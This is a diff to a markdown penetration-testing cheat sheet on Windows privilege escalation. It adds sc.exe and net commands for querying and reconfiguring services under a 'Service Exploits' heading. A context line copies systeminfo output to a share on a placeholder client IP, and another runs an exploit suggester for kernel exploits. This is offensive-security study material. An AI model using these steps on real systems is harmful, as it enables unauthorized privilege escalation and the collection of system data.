@@ -674,11 +674,24 @@ systeminfo > \\{Client IP ADDRESS}\systeminfo.txt
 
 # Use Windows exploit suggestor to find availble kernel exploit
 python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
-
-
 ```
 
+#### Service Exploits
 
+```bash
+# Query the configuration of a service:
+sc.exe qc {NAME}
+
+# Query the current status of a service:
+sc.exe query {NAME}
+
+# Modify a configuration option of a service:
+sc.exe config {NAME} {OPTION}= {VALUE}
+
+Start/Stop a service:
+net start {NAME}
+net stop {NAME}
+```
 
 
 
